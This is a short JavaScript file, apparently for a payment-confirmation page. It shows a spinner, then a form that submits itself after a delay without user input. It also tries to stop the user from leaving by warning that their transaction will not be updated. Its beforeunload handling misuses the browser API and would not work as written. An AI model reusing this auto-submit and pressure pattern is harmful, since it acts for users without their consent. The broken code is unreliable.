const loadingBox = document.querySelector('.loading-box')
const formBox = document.querySelector('.confirm-box')
const targetInput = document.getElementById('merchant')



// TODO: SETTIMEOUT 20 SECONDS FOR SPINNING LOADINBOX

window.addEventListener('load', () => {
    setTimeout(() => {
        loadingBox.style.display = 'none'
        formBox.style.display = 'flex'
        setTimeout(() => {
            formBox.submit()
        }, 15000)
    }, 20000)
})

window.BeforeUnloadEvent((e) => {
    e.preventDefault()
    return (e.returnValue = "Your Transaction will not be Updated if you leave this Page!!")
})





